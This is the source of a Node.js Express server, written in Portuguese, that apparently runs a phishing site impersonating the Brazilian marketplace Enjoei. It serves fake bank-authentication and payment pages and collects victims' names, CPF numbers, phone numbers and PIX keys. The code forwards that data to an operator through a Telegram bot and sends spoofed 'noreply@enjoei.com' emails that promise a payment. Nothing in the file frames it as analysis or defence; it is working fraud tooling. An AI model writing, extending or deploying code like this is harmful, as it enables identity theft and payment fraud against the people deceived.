require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 3000;

// Validação de variáveis de ambiente
const requiredEnvVars = ['TELEGRAM_TOKEN', 'EMAIL_USER', 'EMAIL_PASS'];
for (const envVar of requiredEnvVars) {
  if (!process.env[envVar]) {
    console.error(`Erro: Variável de ambiente ${envVar} não está definida.`);
    process.exit(1);
  }
}

// Configuração de CORS para permitir o domínio específico
const corsOptions = {
  origin: 'https://enjoei-5e5r.onrender.com', // URL do seu frontend
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type', 'Authorization'],
};

app.use(cors(corsOptions)); // Definindo CORS

// Página inicial
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'inicial', 'index.html'));
});

// Rotas HTML
app.get('/acesso', (req, res) => {
  res.sendFile(path.join(__dirname, 'acesso', 'index.html'));
});

app.get('/authbank', (req, res) => {
  res.sendFile(path.join(__dirname, 'authbank', 'index.html'));
});

app.get('/authpay', (req, res) => {
  res.sendFile(path.join(__dirname, 'authpay', 'index.html'));
});

app.get('/confirm', (req, res) => {
  res.sendFile(path.join(__dirname, 'confirm', 'index.html'));
});

app.get('/pay', (req, res) => {
  res.sendFile(path.join(__dirname, 'pay', 'index.html'));
});

app.get('/payvery', (req, res) => {
  res.sendFile(path.join(__dirname, 'payvery', 'index.html'));
});

app.get('/very', (req, res) => {
  res.sendFile(path.join(__dirname, 'very', 'index.html'));
});

// Arquivos estáticos
app.use('/acesso', express.static(path.join(__dirname, 'acesso')));
app.use('/authbank', express.static(path.join(__dirname, 'authbank')));
app.use('/authpay', express.static(path.join(__dirname, 'authpay')));
app.use('/confirm', express.static(path.join(__dirname, 'confirm')));
app.use('/pay', express.static(path.join(__dirname, 'pay')));
app.use('/payvery', express.static(path.join(__dirname, 'payvery')));
app.use('/very', express.static(path.join(__dirname, 'very')));
app.use('/img', express.static(path.join(__dirname, 'img')));
app.use('/inicial', express.static(path.join(__dirname, 'inicial')));

// Telegram Bot
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const ADMINS = process.env.ADMINS?.split(',').map(id => parseInt(id.trim())) || [];
let CHAT_ID = null;

let bot;
try {
  bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

  bot.on('message', (msg) => {
    if (ADMINS.length === 0 || ADMINS.includes(msg.chat.id)) {
      CHAT_ID = msg.chat.id;
      console.log(`Chat ID autorizado atualizado: ${CHAT_ID}`);
    }
  });

  bot.on('polling_error', (error) => {
    console.error('Erro no polling do Telegram:', error.message);
  });
} catch (error) {
  console.error('Erro ao inicializar o Telegram Bot:', error.message);
}

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Configuração de e-mail
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// Enviar e-mail
async function sendConfirmationEmail(cliente, emailDestino) {
  if (!emailDestino) {
    console.warn('Email não fornecido, pulando envio.');
    return;
  }

  const mailOptions = {
    from: 'Enjoei <noreply@enjoei.com>',
    to: emailDestino,
    subject: 'Cadastro realizado com sucesso!',
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; line-height: 1.6; color: #333; background-color: #f9f9f9; border-radius: 10px;">
        <div style="text-align: center; padding: 20px; background-color: #800080; border-radius: 10px 10px 0 0;">
          <h1 style="color: #fff; margin: 0; font-size: 28px;">Cadastro realizado! 🎉</h1>
        </div>
        <div style="padding: 20px; background-color: #fff; border-radius: 0 0 10px 10px;">
          <p style="font-size: 16px; margin: 0 0 15px;">Olá ${cliente.nome},</p>
          <p style="font-size: 16px; margin: 0 0 15px;">Seus dados foram registrados com sucesso em nosso sistema.</p>
          <p style="font-size: 16px; margin: 0 0 15px;"><strong>Chave PIX:</strong> ${cliente.pix_key}</p>
          <p style="font-size: 16px; margin: 0 0 15px;">Em breve você receberá seu pagamento.</p>
        </div>
      </div>
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log('E-mail enviado para:', emailDestino);
  } catch (error) {
    console.error('Erro ao enviar e-mail:', error);
  }
}

// Rota para cadastro
app.post('/api/clients', (req, res) => {
  const { nome, cpf, telefone, pix_key_type, pix_key, email } = req.body;

  if (!nome || !cpf || !telefone || !pix_key_type || !pix_key) {
    return res.status(400).json({ error: 'Todos os campos são obrigatórios' });
  }

  const cliente = {
    nome,
    cpf,
    telefone,
    pix_key_type,
    pix_key,
    status: 'pendente',
    data_cadastro: new Date().toISOString(),
  };

  // Enviar e-mail de confirmação
  sendConfirmationEmail(cliente, email);

  // Enviar para o Telegram
  if (CHAT_ID) {
    const msg = `✨ *Novo Cadastro Recebido!* ✨

👤 *Nome:* \`${nome}\`
🆔 *CPF:* \`${cpf}\`
📞 *Telefone:* \`${telefone}\`

💳 *Chave PIX*
• *Tipo:* \`${pix_key_type}\`
• *Chave:* \`${pix_key}\`

📅 *Data/Hora:* _${new Date().toLocaleString()}_`;

    bot.sendMessage(CHAT_ID, msg, { parse_mode: 'Markdown' }).catch((error) => {
      console.error('Erro ao enviar mensagem para o Telegram:', error.message);
    });
  } else {
    console.warn('CHAT_ID não foi encontrado. Verifique se um administrador interagiu com o bot.');
  }

  // Retornar sucesso (frontend deve redirecionar)
  res.status(201).json({ message: 'Cliente cadastrado com sucesso', redirect: '/VeryPagement/pagamento.html' });
});

// Fallback para frontend (apenas para rotas não-API)
app.get('*', (req, res) => {
  if (req.path.startsWith('/api')) {
    return res.status(404).json({ error: 'Rota API não encontrada' });
  }
  res.sendFile(path.join(__dirname, 'authbank', 'index.html'));
});

// Iniciar servidor
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});

// Fechar conexões
process.on('SIGINT', () => {
  console.log('Encerrando servidor...');
  if (bot) {
    bot.stopPolling();
    console.log('Polling do Telegram encerrado.');
  }
  transporter.close();
  console.log('Conexão do Nodemailer encerrada.');
  process.exit();
});
